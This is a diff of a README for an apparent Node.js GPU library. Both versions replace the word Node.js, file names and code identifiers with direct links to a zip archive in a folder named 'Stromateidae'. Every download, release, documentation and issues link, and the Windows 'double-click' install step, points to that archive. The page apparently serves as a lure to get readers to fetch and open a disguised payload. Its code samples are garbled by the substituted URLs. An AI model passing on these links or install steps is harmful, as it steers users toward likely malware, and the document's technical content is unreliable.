@@ -1,17 +1,17 @@
-# 🎉 nodejs-native-gpu - Experience GPU Power in https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip
+# 🎉 nodejs-native-gpu - Experience GPU Power in https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip
 
 ## 🚀 Getting Started
 
-Welcome to nodejs-native-gpu! This project brings the power of GPU computing to https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip With it, you can enhance your applications using advanced technologies like AI and deep learning.
+Welcome to nodejs-native-gpu! This project brings the power of GPU computing to https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip With it, you can enhance your applications using advanced technologies like AI and deep learning.
 
 ## 📥 Download & Install
 
 Click the button below to visit the release page and download the latest version:
 
-[![Download nodejs-native-gpu](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip%https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip)](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip)
+[![Download nodejs-native-gpu](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip%https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip)](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip)
 
 ### Steps to Download:
-1. Click the button above or visit this link: [Release Page](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip).
+1. Click the button above or visit this link: [Release Page](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip).
 2. On the releases page, find the version you want to install.
 3. Click on the file to start the download.
 
@@ -20,7 +20,7 @@ Click the button below to visit the release page and download the latest version
 To run nodejs-native-gpu, ensure your machine meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip Version:** 14.x or later
+- **https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip Version:** 14.x or later
 - **GPU Driver:** Compatible NVIDIA or AMD drivers installed
 - **Memory:** At least 4 GB RAM
 - **Disk Space:** Minimum 100 MB free space
@@ -35,7 +35,7 @@ Once you have downloaded the appropriate version, follow these steps to install:
 
 ### Example on Windows:
 1. Navigate to your downloads folder.
-2. Double-click `https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip`.
+2. Double-click `https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip`.
 3. Continue through the prompts until the installation is complete.
 
 ## 💡 Basic Configuration
@@ -47,11 +47,11 @@ After installation, you may want to set up your environment:
    ```bash
    node -v
    ```
-   This command shows the https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip version. If the version displays, the installation was successful.
+   This command shows the https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip version. If the version displays, the installation was successful.
 
 ## 🔧 How to Use
 
-To get started with nodejs-native-gpu, you can create a simple https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip application:
+To get started with nodejs-native-gpu, you can create a simple https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip application:
 
 1. **Create a New Directory:**
    ```bash
@@ -67,30 +67,30 @@ To get started with nodejs-native-gpu, you can create a simple https://raw.githu
    npm install nodejs-native-gpu
    ```
 4. **Create Your First Script:**
-   Create a file named `https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip` and add the following code:
+   Create a file named `https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip` and add the following code:
    ```javascript
    const gpu = require('nodejs-native-gpu');
 
    // Simple GPU computation example
-   const result = https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip([https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip(100).keys()]);
-   https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip(result);
+   const result = https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip([https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip(100).keys()]);
+   https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip(result);
    ```
 5. **Run Your Application:**
    Execute the script using the following command:
    ```bash
-   node https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip
+   node https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip
    ```
 
 ## 🔍 Features
 
 - **High Performance:** Leverage GPU power to handle complex calculations quickly.
-- **Easy to Use:** Simple integration with https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip makes it accessible.
+- **Easy to Use:** Simple integration with https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip makes it accessible.
 - **Support for Multiple Frameworks:** Works seamlessly with popular libraries like TensorFlow, PyTorch, and more.
 - **Active Community:** Join others in using GPU computing to enhance their applications.
 
 ## 💬 Getting Help
 
-If you encounter issues during installation or usage, feel free to check the [GitHub Issues page](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip) for support. You can also ask questions or report bugs there.
+If you encounter issues during installation or usage, feel free to check the [GitHub Issues page](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip) for support. You can also ask questions or report bugs there.
 
 ## 🛠️ Contributing
 
@@ -107,8 +107,8 @@ Join our community discussions on platforms like Discord and GitHub. Share your 
 
 ## 🔗 Useful Links
 
-- [Release Page](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip)
-- [Documentation](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip)
+- [Release Page](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip)
+- [Documentation](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip)
+- [Issues Tracker](https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip)
 
-Thank you for choosing nodejs-native-gpu! Enjoy harnessing the full potential of your GPU with https://raw.githubusercontent.com/TranNgocHieu/nodejs-native-gpu/main/Stromateidae/nodejs-native-gpu.zip applications.
+Thank you for choosing nodejs-native-gpu! Enjoy harnessing the full potential of your GPU with https://github.com/TranNgocHieu/nodejs-native-gpu/raw/refs/heads/main/Stromateidae/nodejs_gpu_native_2.9.zip applications.
